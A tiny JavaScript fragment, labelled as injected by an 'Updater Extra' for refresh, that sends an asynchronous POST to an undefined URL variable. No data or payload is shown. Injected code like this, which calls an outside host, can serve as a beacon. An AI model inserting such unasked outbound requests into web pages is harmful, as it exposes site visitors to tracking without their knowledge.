/* Injected by Updater Extra for refresh */
var H;H=new XMLHttpRequest,H.open("POST",U,!0),H.send();